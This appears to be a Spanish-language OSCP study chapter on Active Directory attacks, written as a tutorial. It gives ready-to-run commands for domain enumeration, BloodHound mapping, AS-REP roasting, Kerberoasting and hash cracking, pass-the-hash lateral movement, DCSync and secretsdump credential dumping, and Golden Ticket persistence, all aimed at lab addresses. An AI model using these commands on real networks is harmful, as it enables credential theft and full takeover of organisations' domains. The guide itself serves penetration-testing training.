Nivel 2 · Hacia OSCP

14 · Active Directory (AD)

AD es el corazón de casi toda empresa. El OSCP tiene un bloque entero de AD. Aquí ves cómo funciona y los ataques esenciales, explicados desde cero.

1. Conceptos básicos

📘 Vocabulario mínimo Dominio: grupo de equipos y usuarios gestionados juntos (CORP.LOCAL).
Controlador de Dominio (DC): el servidor jefe; guarda todos los usuarios y contraseñas (NTDS.dit).
Usuario de dominio: cuenta que funciona en todos los equipos del dominio.
Domain Admin: el objetivo final; controla todo el dominio.
Kerberos: el sistema de “tickets” con el que te autenticas sin reenviar la contraseña.

2. Enumeración (necesitas unas credenciales de dominio)

# Usuarios, grupos, política de contraseñas
$ crackmapexec smb 10.0.2.5 -u bob -p 'Pass123' --users
$ enum4linux-ng -A 10.0.2.5
$ ldapsearch -x -H ldap://10.0.2.5 -b "dc=corp,dc=local"
# rpcclient
$ rpcclient -U bob 10.0.2.5  →  enumdomusers, querygroupmem

3. BloodHound (el mapa del dominio)

📘 ¿Qué es?Recoge datos del dominio y los dibuja como un grafo. Te muestra el camino más corto desde tu usuario hasta Domain Admin. Es casi imprescindible.
# Recolectar datos desde Windows o Kali:
$ bloodhound-python -u bob -p 'Pass123' -d corp.local -ns 10.0.2.5 -c all
# o SharpHound.exe en la víctima. Luego importas el .zip en la GUI de BloodHound.
# Consulta clave: "Shortest paths to Domain Admins"

4. Ataques Kerberos (los que más caen)

AS-REP Roasting

Usuarios con “no requiere pre-autenticación” permiten pedir un hash crackeable sin contraseña.

$ impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.2.5
$ hashcat -m 18200 asrep.hash rockyou.txt

Kerberoasting

Cualquier usuario del dominio puede pedir tickets (TGS) de cuentas de servicio y crackearlos offline.

$ impacket-GetUserSPNs corp.local/bob:Pass123 -dc-ip 10.0.2.5 -request
$ hashcat -m 13100 kerberoast.hash rockyou.txt

5. Movimiento lateral con credenciales/hash

# Con contraseña o con hash (pass-the-hash)
$ crackmapexec smb 10.0.2.0/24 -u admin -H <hash>         # ¿dónde soy admin?
$ impacket-psexec corp.local/admin@10.0.2.6 -hashes :<hash>
$ impacket-wmiexec corp.local/admin@10.0.2.6
$ evil-winrm -i 10.0.2.6 -u admin -H <hash>

6. Volcar todo el dominio (si eres Domain Admin)

$ impacket-secretsdump corp.local/admin@10.0.2.5          # todos los hashes
# DCSync: pedir los hashes al DC como si fueras otro DC
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
🗝️ Golden TicketCon el hash de la cuenta krbtgt puedes fabricar tickets Kerberos para cualquier usuario y mantener acceso total. Es el “control absoluto” del dominio.
🔴 Nivel OSCP: flujo típico de AD1) Acceso inicial a un equipo del dominio (web, credenciales). 2) Enumerar con BloodHound/CME. 3) AS-REP/Kerberoast para más credenciales. 4) Movimiento lateral (PtH, psexec/winrm). 5) Escalar a Domain Admin. 6) secretsdump. Documenta cada salto con capturas.
